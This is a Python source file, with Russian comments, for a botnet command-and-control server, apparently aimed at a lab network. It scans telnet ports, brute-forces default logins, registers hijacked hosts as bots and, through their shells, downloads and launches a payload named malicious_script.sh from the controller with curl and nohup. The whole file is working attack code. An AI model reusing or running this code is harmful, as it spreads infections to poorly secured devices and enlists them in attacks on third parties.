import asyncio
import random
from aiohttp import web
from aiohttp.web import FileResponse
import logging

SCRIPT_PATH = "malicious_script.sh"
SCAN_PORTS = [23, 2323]
CREDENTIALS = [
    ("admin", "12345678"), ("root", "12345")
]

class BotnetServer:
    def __init__(self):
        self.bots = {}
        self.scanning = False
        self.app = web.Application()
        self.app.add_routes([
            web.get('/start_scan', self.start_scan),
            web.get('/stop_scan', self.stop_scan),
            web.get('/list_bots', self.list_bots),
            web.get('/deploy_scripts', self.deploy_scripts),
            web.get('/execute_scripts', self.execute_scripts),
            web.get('/script', self.serve_script),
            web.get('/stop_attack', self.stop_attack)
        ])
        self.logger = logging.getLogger('cnc')
        logging.basicConfig(level=logging.INFO)

    async def serve_script(self, request):
        return FileResponse(SCRIPT_PATH, headers={'Content-Type': 'text/plain'})

    async def deploy_scripts(self, request):
        results = {}

        for bot_id, bot in self.bots.items():
            ip = bot['ip']
            credentials = bot.get('credentials')
            if not credentials:
                results[bot_id] = "No credentials found"
                continue

            try:
                # Подключаемся по telnet
                reader, writer = await asyncio.open_connection(ip, 23)

                # Авторизация
                await reader.readuntil(b"login: ")
                writer.write(credentials[0].encode() + b"\n")
                await writer.drain()

                await reader.readuntil(b"Password: ")
                writer.write(credentials[1].encode() + b"\n")
                await writer.drain()

                # Проверка успешности входа
                response = await reader.read(1024)
                if b"Login incorrect" in response:
                    results[bot_id] = "Login failed"
                    writer.close()
                    continue

                # Команды для загрузки скрипта
                commands = [
                    f"curl -s -o /tmp/malicious_script.sh http://172.25.0.100:8080/script",
                    "chmod +x /tmp/malicious_script.sh",
                    "exit"
                ]

                for cmd in commands:
                    writer.write(cmd.encode() + b"\n")
                    await writer.drain()
                    await asyncio.sleep(0.5)

                writer.close()
                await writer.wait_closed()
                results[bot_id] = "Script deployed successfully"

            except Exception as e:
                results[bot_id] = f"Error: {str(e)}"

        return web.json_response(results)

    async def execute_scripts(self, request):
        results = {}

        for bot_id, bot in self.bots.items():
            ip = bot['ip']
            credentials = bot.get('credentials')
            if not credentials:
                results[bot_id] = "No credentials found"
                continue

            try:
                # Подключаемся по telnet
                reader, writer = await asyncio.open_connection(ip, 23)

                # Авторизация
                await reader.readuntil(b"login: ")
                writer.write(credentials[0].encode() + b"\n")
                await writer.drain()

                await reader.readuntil(b"Password: ")
                writer.write(credentials[1].encode() + b"\n")
                await writer.drain()

                # Проверка успешности входа
                response = await reader.read(1024)
                if b"Login incorrect" in response:
                    results[bot_id] = "Login failed"
                    writer.close()
                    continue

                # Запускаем скрипт в фоне с nohup
                commands = [
                    "chmod +x /tmp/malicious_script.sh",
                    "nohup /tmp/malicious_script.sh &",  # Запуск в фоне
                    "exit"
                ]

                for cmd in commands:
                    writer.write(cmd.encode() + b"\n")
                    await writer.drain()
                    await asyncio.sleep(0.5)

                writer.close()
                await writer.wait_closed()
                results[bot_id] = "Attack started in background"

            except Exception as e:
                results[bot_id] = f"Error: {str(e)}"

        return web.json_response(results)

    async def stop_attack(self, request):
        results = {}

        for bot_id, bot in self.bots.items():
            ip = bot['ip']
            credentials = bot.get('credentials')
            if not credentials:
                results[bot_id] = "No credentials found"
                continue

            try:
                reader, writer = await asyncio.open_connection(ip, 23)

                # Авторизация
                await reader.readuntil(b"login: ")
                writer.write(credentials[0].encode() + b"\n")
                await writer.drain()

                await reader.readuntil(b"Password: ")
                writer.write(credentials[1].encode() + b"\n")
                await writer.drain()

                # Команды для остановки
                commands = [
                    "kill $(cat /tmp/attack.pids) 2>/dev/null",  # Останавливаем все процессы
                    "rm -f /tmp/attack.pids",
                    "exit"
                ]

                for cmd in commands:
                    writer.write(cmd.encode() + b"\n")
                    await writer.drain()
                    await asyncio.sleep(0.5)

                writer.close()
                await writer.wait_closed()
                results[bot_id] = "Attack stopped"

            except Exception as e:
                results[bot_id] = f"Error: {str(e)}"

        return web.json_response(results)


    def find_credentials_for_ip(self, ip):
        for bot in self.bots.values():
            if bot['ip'] == ip and bot.get('credentials'):
                return bot['credentials']
        return None

    async def start_scan(self, request):
        if not self.scanning:
            self.scanning = True
            asyncio.create_task(self.scan_network())
            return web.Response(text="Scanning started")
        return web.Response(text="Scanning already in progress")

    async def stop_scan(self, request):
        self.scanning = False
        return web.Response(text="Scanning stopped")

    async def list_bots(self, request):
        return web.json_response(self.bots)



    async def try_telnet_infection(self, ip, port, credentials):
        try:
            reader, writer = await asyncio.open_connection(ip, port)

            # Авторизация
            await reader.readuntil(b"login: ")
            writer.write(credentials[0].encode() + b"\n")
            await writer.drain()

            await reader.readuntil(b"Password: ")
            writer.write(credentials[1].encode() + b"\n")
            await writer.drain()

            # Проверка успешности входа
            response = await reader.read(1024)
            if b"Login incorrect" in response:
                return False

            # Регистрируем бота
            bot_id = f"bot-{random.randint(1000, 9999)}"
            self.bots[bot_id] = {
                'ip': ip,
                'last_seen': asyncio.get_event_loop().time(),
                'credentials': credentials
            }
            self.logger.info(f"Registered new bot: {bot_id}\n(IP: {ip}, Creds: {credentials})\n")

            writer.close()
            await writer.wait_closed()
            return True

        except Exception as e:
            self.logger.error(f"Telnet infection failed: {str(e)}")
            return False

    async def scan_network(self):
        self.logger.info("Starting network scan...")

        for ip_suffix in [10, 11, 12]:
            ip = f"172.25.0.{ip_suffix}"
            self.logger.debug(f"Scanning IP: {ip}")

            for port in SCAN_PORTS:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, port),
                        timeout=1.0
                    )
                    writer.close()
                    await writer.wait_closed()
                    self.logger.info(f"Port {port} open on {ip}")

                    for creds in CREDENTIALS:
                        self.logger.debug(f"Trying credentials: {creds}")
                        if await self.try_login(ip, port, creds):
                            self.logger.info(f"Successful login: {ip} with {creds}")
                            if await self.try_telnet_infection(ip, port, creds):
                                break

                except Exception as e:
                    self.logger.debug(f"Error scanning {ip}:{port}: {str(e)}")
                    continue

        await asyncio.sleep(2)  # Пауза между сканированиями

    async def try_login(self, ip, port, credentials):
        try:
            reader, writer = await asyncio.open_connection(ip, port)

            # Читаем приветствие
            await reader.readuntil(b"login: ")
            writer.write(credentials[0].encode() + b"\n")
            await writer.drain()

            await reader.readuntil(b"Password: ")
            writer.write(credentials[1].encode() + b"\n")
            await writer.drain()

            response = await reader.read(1024)
            writer.close()
            await writer.wait_closed()

            return b"Login incorrect" not in response

        except Exception:
            return False


async def init_app():
    server = BotnetServer()
    return server.app


if __name__ == "__main__":
    web.run_app(init_app(), port=8080)